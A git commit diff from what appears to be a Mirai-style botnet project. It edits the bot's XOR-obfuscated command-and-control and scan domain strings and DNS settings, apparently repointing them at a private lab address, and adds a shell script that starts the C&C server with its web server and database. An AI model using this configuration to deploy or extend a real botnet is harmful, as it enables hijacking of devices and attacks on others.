96f76d0dc7d82e16e049110b203844534eae05aa
Riccardo Germenia <odinmylord@duck.com>
2024-05-13 22:57:18 +0200

    almost there

--- bot/config.h
+++ bot/config.h
@@ -1,12 +1,12 @@
 #ifndef CONFIG_H 
 #define CONFIG_H 
-#define DOMAIN_NAME "\x41\x4E\x4D\x57\x46\x0C\x45\x4E\x4D\x55\x4F\x43\x4C\x17\x17\x16\x0C\x45\x53\x22"
-#define DOMAIN_NAME_LEN 20
-#define SCAN_DOMAIN_NAME "\x41\x4E\x4D\x57\x46\x0C\x45\x4E\x4D\x55\x4F\x43\x4C\x17\x17\x16\x0C\x45\x53\x22"
-#define SCAN_DOMAIN_NAME_LEN 20
-#define DNS_0 8
-#define DNS_1 8
-#define DNS_2 8
-#define DNS_3 8
+#define DOMAIN_NAME "\x13\x1B\x10\x0C\x13\x14\x1A\x0C\x13\x12\x0C\x13\x12\x22"
+#define DOMAIN_NAME_LEN 14
+#define SCAN_DOMAIN_NAME "\x13\x1B\x10\x0C\x13\x14\x1A\x0C\x13\x12\x0C\x13\x12\x22"
+#define SCAN_DOMAIN_NAME_LEN 14
+#define DNS_0 127
+#define DNS_1 0
+#define DNS_2 0
+#define DNS_3 11
 // #define INIT_SCANNER
 #endif
---
+++ cnc/starter.sh
@@ -0,0 +1,5 @@
+service apache2 start
+cat tools/db.sql | mysql
+
+sh apache2.sh
+./debug/cnc
